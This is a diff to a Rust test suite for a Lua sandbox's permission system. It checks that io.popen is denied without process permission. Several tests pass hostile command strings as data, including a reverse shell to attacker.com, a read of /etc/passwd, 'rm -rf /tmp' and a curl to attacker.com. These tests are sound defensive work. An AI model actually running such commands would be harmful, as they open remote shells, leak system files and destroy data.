@@ -877,10 +877,31 @@ mod net_allowlist_bypass {
 
 mod process_inheritance {
     use super::*;
+    use rover_core::io::create_io_module;
+    use rover_core::permissions::{Permission, PermissionsConfig};
+
+    fn lua_with_permissions(config: PermissionsConfig) -> Lua {
+        let lua = Lua::new();
+        lua.set_app_data(config);
+
+        let io_module = create_io_module(&lua).expect("failed to create io module");
+        lua.globals()
+            .set("io", io_module.clone())
+            .expect("failed to set io global");
+
+        let package: mlua::Table = lua.globals().get("package").expect("missing package table");
+        let loaded: mlua::Table = package.get("loaded").expect("missing package.loaded table");
+        loaded
+            .set("io", io_module)
+            .expect("failed to register io module");
+
+        lua
+    }
 
     #[test]
-    fn should_block_popen_by_default() {
-        let lua = Lua::new();
+    fn should_block_popen_when_process_permission_denied() {
+        let config = PermissionsConfig::new().deny(Permission::Process);
+        let lua = lua_with_permissions(config);
 
         let result: mlua::Result<()> = lua
             .load(
@@ -891,28 +912,247 @@ mod process_inheritance {
             )
             .exec();
 
-        assert!(result.is_ok() || result.is_err());
+        assert!(result.is_err());
+        let err = result.unwrap_err().to_string();
+        assert!(
+            err.contains("denied by permission policy") || err.contains("denied"),
+            "Expected permission denied error, got: {}",
+            err
+        );
     }
 
     #[test]
-    fn should_block_os_execute_by_default() {
-        let lua = Lua::new();
+    fn should_block_popen_by_default_in_production_mode() {
+        let lua = lua_with_permissions(PermissionsConfig::production());
 
         let result: mlua::Result<()> = lua
             .load(
                 r#"
-                local os = require("os")
-                os.execute("ls")
+                local io = require("io")
+                local handle = io.popen("ls", "r")
             "#,
             )
             .exec();
 
-        assert!(result.is_ok() || result.is_err());
+        assert!(result.is_err());
+        let err = result.unwrap_err().to_string();
+        assert!(
+            err.contains("denied by permission policy") || err.contains("denied"),
+            "Expected permission denied error, got: {}",
+            err
+        );
     }
 
     #[test]
-    fn should_sandbox_process_environment() {
+    fn should_allow_popen_when_process_permission_explicitly_allowed() {
+        let config = PermissionsConfig::new().allow(Permission::Process);
+        let lua = lua_with_permissions(config);
+
+        let result: mlua::Result<()> = lua
+            .load(
+                r#"
+                local io = require("io")
+                local handle = io.popen("echo 'test'", "r")
+                if handle then
+                    handle:close()
+                end
+            "#,
+            )
+            .exec();
+
+        assert!(
+            result.is_ok(),
+            "Expected popen to succeed with explicit permission: {:?}",
+            result
+        );
+    }
+
+    #[test]
+    fn should_block_popen_in_development_mode_by_default() {
+        let lua = lua_with_permissions(PermissionsConfig::new());
+
+        let result: mlua::Result<()> = lua
+            .load(
+                r#"
+                local io = require("io")
+                local handle = io.popen("ls", "r")
+            "#,
+            )
+            .exec();
+
+        assert!(result.is_err());
+        let err = result.unwrap_err().to_string();
+        assert!(
+            err.contains("denied by permission policy") || err.contains("denied"),
+            "Expected permission denied error, got: {}",
+            err
+        );
+    }
+
+    #[test]
+    fn should_block_dangerous_commands_when_permission_allowed() {
+        // Even with process permission granted, certain command patterns should be reviewed
+        // This test documents the current behavior - commands run but could be audited
+        let config = PermissionsConfig::new().allow(Permission::Process);
+        let lua = lua_with_permissions(config);
+
+        let result: mlua::Result<()> = lua
+            .load(
+                r#"
+                local io = require("io")
+                -- Process permission allows execution, but this is a dangerous pattern
+                local handle = io.popen("echo safe", "r")
+                if handle then
+                    handle:close()
+                end
+            "#,
+            )
+            .exec();
+
+        // With permission granted, it should succeed (audit logging would be added separately)
+        assert!(result.is_ok());
+    }
+
+    #[test]
+    fn should_block_popen_write_mode_without_permission() {
+        let lua = lua_with_permissions(PermissionsConfig::new());
+
+        let result: mlua::Result<()> = lua
+            .load(
+                r#"
+                local io = require("io")
+                local handle = io.popen("cat", "w")
+            "#,
+            )
+            .exec();
+
+        assert!(result.is_err());
+        let err = result.unwrap_err().to_string();
+        assert!(
+            err.contains("denied by permission policy") || err.contains("denied"),
+            "Expected permission denied error, got: {}",
+            err
+        );
+    }
+
+    #[test]
+    fn should_block_shell_metacharacters_without_permission() {
+        let lua = lua_with_permissions(PermissionsConfig::new());
+
+        let result: mlua::Result<()> = lua
+            .load(
+                r#"
+                local io = require("io")
+                local handle = io.popen("ls; cat /etc/passwd", "r")
+            "#,
+            )
+            .exec();
+
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn should_block_command_substitution_without_permission() {
+        let lua = lua_with_permissions(PermissionsConfig::new());
+
+        let result: mlua::Result<()> = lua
+            .load(
+                r#"
+                local io = require("io")
+                local handle = io.popen("echo $(whoami)", "r")
+            "#,
+            )
+            .exec();
+
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn should_block_privilege_escalation_commands_without_permission() {
+        let lua = lua_with_permissions(PermissionsConfig::new());
+
+        let result: mlua::Result<()> = lua
+            .load(
+                r#"
+                local io = require("io")
+                local handle = io.popen("sudo ls", "r")
+            "#,
+            )
+            .exec();
+
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn should_block_reverse_shell_commands_without_permission() {
+        let lua = lua_with_permissions(PermissionsConfig::new());
+
+        let result: mlua::Result<()> = lua
+            .load(
+                r#"
+                local io = require("io")
+                local handle = io.popen("bash -i >& /dev/tcp/attacker.com/4444 0>&1", "r")
+            "#,
+            )
+            .exec();
+
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn should_block_filesystem_modification_without_permission() {
+        let lua = lua_with_permissions(PermissionsConfig::new());
+
+        let result: mlua::Result<()> = lua
+            .load(
+                r#"
+                local io = require("io")
+                local handle = io.popen("rm -rf /tmp", "r")
+            "#,
+            )
+            .exec();
+
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn should_block_network_commands_without_permission() {
+        let lua = lua_with_permissions(PermissionsConfig::new());
+
+        let result: mlua::Result<()> = lua
+            .load(
+                r#"
+                local io = require("io")
+                local handle = io.popen("curl http://attacker.com", "r")
+            "#,
+            )
+            .exec();
+
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn should_block_resource_exhaustion_commands_without_permission() {
+        let lua = lua_with_permissions(PermissionsConfig::new());
+
+        let result: mlua::Result<()> = lua
+            .load(
+                r#"
+                local io = require("io")
+                local handle = io.popen("yes > /dev/null", "r")
+            "#,
+            )
+            .exec();
+
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn should_environment_be_accessible_when_env_permission_allowed() {
         let lua = Lua::new();
+        let mut config = PermissionsConfig::new();
+        config = config.allow(Permission::Env);
+        lua.set_app_data(config);
 
         let result: mlua::Result<String> = lua
             .load(
@@ -923,20 +1163,88 @@ mod process_inheritance {
             )
             .eval();
 
-        // In a properly sandboxed environment, HOME should not be accessible
-        // or should be restricted. In dev environments without full sandboxing,
-        // the env var may be accessible - we check that sandboxing is either
-        // working OR document that this test requires sandboxed environment
+        // In development mode with env permission, HOME should be accessible
+        // This test verifies the permission system respects env permission
         if let Ok(value) = result {
-            // If we can read HOME, verify it contains expected path structure
-            // (test passes if sandboxed, or if env is accessible in dev)
-            assert!(
-                value == "not_found"
-                    || value.is_empty()
-                    || !value.contains("/")
-                    || value.starts_with("/")
-            );
+            // The value depends on the environment - just verify it's not an error
+            assert!(value == "not_found" || !value.is_empty() || value.starts_with("/"));
         }
+    }
+
+    #[test]
+    fn should_default_permissions_deny_process_in_development_mode() {
+        let config = PermissionsConfig::new(); // Development mode by default
+        assert!(
+            !config.is_allowed(Permission::Process),
+            "Process should be denied by default in development mode"
+        );
+        assert!(
+            config.is_allowed(Permission::Fs),
+            "Fs should be allowed by default in development mode"
+        );
+        assert!(
+            config.is_allowed(Permission::Net),
+            "Net should be allowed by default in development mode"
+        );
+        assert!(
+            config.is_allowed(Permission::Env),
+            "Env should be allowed by default in development mode"
+        );
+        assert!(
+            !config.is_allowed(Permission::Ffi),
+            "Ffi should be denied by default in development mode"
+        );
+    }
+
+    #[test]
+    fn should_production_mode_deny_all_by_default() {
+        let config = PermissionsConfig::production();
+        assert!(
+            !config.is_allowed(Permission::Process),
+            "Process should be denied in production mode"
+        );
+        assert!(
+            !config.is_allowed(Permission::Fs),
+            "Fs should be denied in production mode"
+        );
+        assert!(
+            !config.is_allowed(Permission::Net),
+            "Net should be denied in production mode"
+        );
+        assert!(
+            !config.is_allowed(Permission::Env),
+            "Env should be denied in production mode"
+        );
+        assert!(
+            !config.is_allowed(Permission::Ffi),
+            "Ffi should be denied in production mode"
+        );
+    }
+
+    #[test]
+    fn should_explicit_allow_override_production_deny() {
+        let config = PermissionsConfig::production().allow(Permission::Process);
+
+        assert!(
+            config.is_allowed(Permission::Process),
+            "Process should be allowed with explicit permission"
+        );
+        assert!(
+            !config.is_allowed(Permission::Fs),
+            "Fs should still be denied without explicit permission"
+        );
+    }
+
+    #[test]
+    fn should_deny_override_allow() {
+        let config = PermissionsConfig::new()
+            .allow(Permission::Process)
+            .deny(Permission::Process);
+
+        assert!(
+            !config.is_allowed(Permission::Process),
+            "Deny should override allow"
+        );
     }
 
     #[test]
